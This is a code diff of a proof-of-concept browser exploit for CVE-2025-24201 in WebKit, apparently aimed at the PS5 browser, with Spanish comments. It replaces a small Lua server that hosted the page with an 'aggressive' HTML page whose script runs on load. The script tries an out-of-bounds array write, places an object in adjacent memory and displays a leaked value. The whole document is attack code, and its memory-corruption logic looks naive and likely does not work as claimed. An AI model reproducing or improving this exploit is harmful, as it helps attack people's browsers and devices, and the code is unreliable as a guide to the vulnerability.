@@ -1,32 +1,39 @@
-local socket = require("socket")
-
-local html = [[
-HTTP/1.1 200 OK
-Content-Type: text/html
-
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PoC CVE-2025-24201</title>
+  <title>PoC Agresivo CVE-2025-24201</title>
   <script>
-    window.onload = function() {
-      let arr = [1.1, 2.2, 3.3];
-      arr.length = 0xfffffffe;
-      arr[0xfffffffe - 1] = 13.37;
-      for (let i = 0; i < 10000; i++) arr[i] = 1.1;
-      document.body.innerHTML = "<h1>PoC ejecutado.</h1>";
-    };
+    function trigger() {
+      let oobArray = [1.1, 2.2, 3.3];
+      let corruptArray = [13.37];
+      let victimObj = { marker: 0x41414141 };
+
+      // Intentar provocar OOB con set length
+      oobArray.length = 0x100;
+      for (let i = 0; i < 100000; i++) {
+        oobArray.push(1.1);
+      }
+
+      try {
+        // Forzar acceso fuera de límites
+        for (let i = 0; i < 10000; i++) {
+          oobArray[i] = 1.1;
+        }
+        oobArray[0x10000] = 13.37; // OOB write
+        corruptArray[0] = victimObj;
+
+        // Intento de manipular memoria adyacente
+        let leak = oobArray[0x10000];
+        document.body.innerHTML = `<h1>Leaked: ${leak}</h1>`;
+      } catch (e) {
+        document.body.innerHTML = `<h1>EXCEPTION: ${e.message}</h1>`;
+      }
+    }
+
+    window.onload = trigger;
   </script>
 </head>
-<body><h1>PS5 WebKit Test</h1></body>
+<body>
+  <h1>PoC Agresivo ejecutando...</h1>
+</body>
 </html>
-]]
-
-local server = socket.bind("*", 8080)
-print("Servidor PoC en http://[TU_IP]:8080/")
-
-while true do
-  local client = server:accept()
-  client:send(html)
-  client:close()
-end
